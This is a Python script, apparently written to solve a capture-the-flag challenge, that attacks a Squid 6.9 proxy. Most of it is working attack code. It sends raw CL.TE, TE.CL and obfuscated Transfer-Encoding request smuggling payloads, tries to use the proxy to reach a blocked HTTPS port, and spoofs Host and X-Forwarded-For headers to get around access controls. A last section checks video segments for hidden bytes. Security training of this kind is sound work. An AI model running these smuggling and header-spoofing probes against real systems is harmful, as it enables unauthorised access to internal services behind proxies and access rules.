import socket
import ssl
import re
import base64

host = 'web-17e4256823c5a05c.web.h7tex.com'
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# === NEW STRATEGY: HTTP Request Smuggling via Squid ===
# Squid 6.9 may be vulnerable to request smuggling
# Try HTTP/1.1 TE+CL desync to access internal paths

print("=== HTTP Request Smuggling tests (Squid 6.9) ===")

# Test 1: Content-Length/Transfer-Encoding discrepancy
def test_smuggling_1():
    """CL.TE: Backend uses CL, Squid uses TE"""
    s = socket.create_connection((host, 80), timeout=5)
    # Send a chunked request where the chunk size differs from Content-Length
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    s.sendall(req.encode())
    try:
        resp = s.recv(1024)
        s.close()
        return resp
    except:
        s.close()
        return b""

# Test 2: TE.CL: Squid uses TE, backend uses CL
def test_smuggling_2():
    """TE.CL smuggling"""
    s = socket.create_connection((host, 80), timeout=5)
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "A\r\n"
        "0\r\n"
        "\r\n"
    )
    s.sendall(req.encode())
    try:
        resp = s.recv(1024)
        s.close()
        return resp
    except:
        s.close()
        return b""

# Test 3: Obfuscated TE header
def test_smuggling_3():
    """TE header obfuscation"""
    s = socket.create_connection((host, 80), timeout=5)
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: xchunked\r\n"
        "\r\n"
        "1\r\n"
        "A\r\n"
        "0\r\n"
        "\r\n"
    )
    s.sendall(req.encode())
    try:
        resp = s.recv(1024)
        s.close()
        return resp
    except:
        s.close()
        return b""

for i, (name, func) in enumerate([("CL.TE", test_smuggling_1), 
                                    ("TE.CL", test_smuggling_2),
                                    ("TE-obfuscate", test_smuggling_3)]):
    try:
        r = func()
        status = r.split(b'\r\n')[0].decode() if r else "No response"
        print(f"  {name}: {status}")
        if r:
            body = r.split(b'\r\n\r\n', 1)
            if len(body) > 1:
                print(f"    Body: {body[1][:100].decode(errors='replace')}")
    except Exception as e:
        print(f"  {name}: Error: {e}")

# === NEW STRATEGY: Fetch the m3u8 from port 80 Squid proxy 
# using the HTTPS server's address in the Host header ===
print("\n=== Using Squid to proxy to HTTPS server ===")

# Approach: use Squid as a proxy for HTTPS by specifying full URL
# This might bypass the ACL that blocks port 443 directly
for path in ['/boardroom/index.m3u8', '/boardroom/', '/boardroom']:
    try:
        s = socket.create_connection((host, 80), timeout=5)
        # Try both HTTP and HTTPS URLs in the request line
        for scheme in ['http', 'https']:
            req = (
                f"GET {scheme}://{host}{path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Connection: close\r\n\r\n"
            )
            s.sendall(req.encode())
            resp = s.recv(1024)
            status = resp.split(b'\r\n')[0].decode()
            print(f"  {scheme}:{path} -> {status}")
            if b'200' in resp:
                body = resp.split(b'\r\n\r\n', 1)
                if len(body) > 1:
                    print(f"    Content: {body[1][:200].decode(errors='replace')}")
        s.close()
    except Exception as e:
        print(f"  Error: {e}")

# === Try accessing the HTTPS server on port 80 via Host header trick ===
print("\n=== Host header tricks on port 80 ===")

host_tricks = [
    f'{host}:443',
    f'{host}%3a443',  # URL-encoded colon
    f'{host}:80',
    '127.0.0.1:443',
    'tg42546d:443',
    'localhost:443',
]

for h in host_tricks:
    try:
        s = socket.create_connection((host, 80), timeout=3)
        req = f"GET /boardroom/index.m3u8 HTTP/1.1\r\nHost: {h}\r\nConnection: close\r\n\r\n"
        s.sendall(req.encode())
        resp = s.recv(512)
        status = resp.split(b'\r\n')[0].decode()
        if '404' not in status:
            print(f"  Host: {h} -> {status}")
            print(f"    {resp[:300].decode(errors='replace')}")
        s.close()
    except Exception as e:
        pass

# === Try fetching the m3u8 with different X-Forwarded headers ===
print("\n=== X-Forwarded-For tricks on port 1337 ===")
for xff in ['127.0.0.1', '::1', '10.0.0.1', '192.168.1.1', 'localhost']:
    try:
        s = socket.create_connection((host, 1337), timeout=3)
        req = (
            f"GET /boardroom/index.m3u8 HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Forwarded-For: {xff}\r\n"
            f"X-Real-IP: {xff}\r\n"
            f"X-Forwarded-Host: {host}\r\n"
            "Connection: close\r\n\r\n"
        )
        s.sendall(req.encode())
        resp = s.recv(512)
        status = resp.split(b'\r\n')[0].decode()
        if '404' not in status:
            print(f"  XFF {xff}: {status}")
        s.close()
    except:
        pass

# === Check the m3u8 segments for hidden metadata using byte analysis ===
print("\n=== Analyzing TS segments for TS-specific steganography ===")

# Check each segment's first-last bytes for embedded data
for seg_idx in range(6):
    with open(f'solutions/boardroom_av/segments/seg_{seg_idx:03d}.ts', 'rb') as f:
        seg = f.read()
    
    # Look for any non-TS-standard data
    # TS packets are exactly 188 bytes
    remainder = len(seg) % 188
    if remainder != 0:
        print(f"  seg_{seg_idx:03d}: {len(seg)} bytes, {remainder} byte remainder!")
        print(f"    Remainder bytes: {seg[-remainder:].hex()}")
    else:
        print(f"  seg_{seg_idx:03d}: {len(seg)} bytes, clean (multiple of 188)")

print("\nDone.")
